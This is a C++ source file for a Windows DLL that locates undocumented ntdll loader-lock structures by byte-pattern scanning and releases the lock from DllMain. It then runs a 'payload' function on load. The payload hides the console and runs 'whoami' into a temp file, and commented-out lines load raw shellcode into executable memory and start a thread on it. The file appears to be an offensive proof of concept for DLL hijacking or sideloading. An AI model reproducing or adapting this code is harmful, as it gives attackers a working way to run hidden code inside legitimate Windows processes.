#include "pch.h"
#include <sstream>
#include <fstream>
#include <lmcons.h>  

typedef _Return_type_success_(return >= 0) long NTSTATUS;

typedef NTSYSAPI NTSTATUS (NTAPI* pLdrUnlockLoaderLock)(
    _In_ ULONG Flags,
    _In_opt_ PVOID Cookie
);
typedef NTSTATUS (__fastcall* pLdrpReleaseLoaderLock)(__int64 a1, char a2, int a3);

HMODULE ntDll = LoadLibraryA("ntdll.dll");


PCRITICAL_SECTION getLdrpLoaderLock() {
    PUCHAR startAddress = (PUCHAR)GetProcAddress(ntDll, "RtlpNotOwnerCriticalSection");
    LPVOID LdrpLoaderLock = NULL;
    for (int i = 0; i < 0x1000; i++) {
		if (startAddress[i] == 0x48 && startAddress[i + 7] == 0x48 && startAddress[i + 8] == 0x3b
			&& startAddress[i + 9] == 0xc8 && startAddress[i + 10] == 0x0f) {
            LONG offset = *(PLONG)(startAddress + i + 3);
            LdrpLoaderLock = (startAddress + i + 7 + offset);
			break;
		}
	}
    return (PCRITICAL_SECTION)LdrpLoaderLock;
}
pLdrpReleaseLoaderLock getLdrpReleaseLoaderLock() {
    pLdrpReleaseLoaderLock LdrpReleaseLoaderLock = NULL;
    pLdrUnlockLoaderLock LdrUnlockLoaderLock = (pLdrUnlockLoaderLock)GetProcAddress(ntDll, "LdrUnlockLoaderLock");
    PUCHAR tem = (PUCHAR)LdrUnlockLoaderLock;

    for (int i = 0; i < 0x100; i++) {
        if (tem[i] == 0xe8 && tem[i + 5] == 0xEB && tem[i + 7] == 0x45 && tem[i + 8] == 0x33 && tem[i + 9] == 0xc0) {
            LONG offset = *(PLONG)(tem + i + 1);
            // std::stringstream ss;
            // ss << std::hex << offset;
            // std::string str = ss.str();
            // MessageBoxA(0, str.c_str(), 0, 0);
            LdrpReleaseLoaderLock = (pLdrpReleaseLoaderLock)(tem + i + 5 + offset);
            break;
        }
    }

    return LdrpReleaseLoaderLock;
}
LPVOID getLdrpWorkInProgress() {
    LPVOID LdrpWorkInProgress = NULL;
    PUCHAR RtlExitUserProcess = (PUCHAR)GetProcAddress(ntDll, "RtlExitUserProcess");
    RtlExitUserProcess += 0x6000;

    for (int i = 0; i < 0x3000; i++) {
        if (RtlExitUserProcess[i] == 0x83 && RtlExitUserProcess[i + 7] == 0x48 && RtlExitUserProcess[i + 14] == 0xe8
            && RtlExitUserProcess[i + 19] == 0x48 && RtlExitUserProcess[i + 26] == 0x33
            && RtlExitUserProcess[i + 27] == 0xD2 && RtlExitUserProcess[i + 28] == 0x48) {

            LONG offset = *(PLONG)(RtlExitUserProcess + i + 2);
            LdrpWorkInProgress = (RtlExitUserProcess + i + 7 + offset);
            break;
        }
    }
    return LdrpWorkInProgress;
}
void preloadLib() {
    LoadLibrary(L"SHCORE");
    LoadLibrary(L"msvcrt");
    LoadLibrary(L"combase");
    LoadLibrary(L"RPCRT4");
    LoadLibrary(L"bcryptPrimitives");
    LoadLibrary(L"shlwapi");
    LoadLibrary(L"windows.storage.dll"); 
    LoadLibrary(L"Wldp");
    LoadLibrary(L"advapi32");
    LoadLibrary(L"sechost");
}


void payload() {
    HWND hWnd = GetConsoleWindow();
    if (hWnd != NULL)
        ShowWindow(hWnd, SW_HIDE);

    system("whoami >> C:\\Windows\\Temp\\1.txt");

    // LPVOID lpMem = VirtualAlloc(NULL, sizeof(rawData), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    // memcpy(lpMem, rawData, sizeof(rawData)); 
    // CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpMem, NULL, 0, NULL); 
    // 
    // 
    // ExitThread(0); 


}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
    )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH: {

        PCRITICAL_SECTION LdrpLoaderLock = getLdrpLoaderLock();

       
        LeaveCriticalSection(LdrpLoaderLock);
        preloadLib();

        
        pLdrpReleaseLoaderLock LdrpReleaseLoaderLock = getLdrpReleaseLoaderLock();
        PVOID LdrpWorkInProgress = getLdrpWorkInProgress();



        if(LdrpReleaseLoaderLock != NULL) {
            LdrpReleaseLoaderLock(0, 0, 0);
        }else{
            return FALSE;
        }


        SetEvent((HANDLE)0x40);
        SetEvent((HANDLE)0x4);
        *(PBOOLEAN)LdrpWorkInProgress = FALSE;

        payload();

        *(PBOOLEAN)LdrpWorkInProgress = TRUE;
        ResetEvent((HANDLE)0x40);
        ResetEvent((HANDLE)0x4);
        EnterCriticalSection(LdrpLoaderLock);

        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}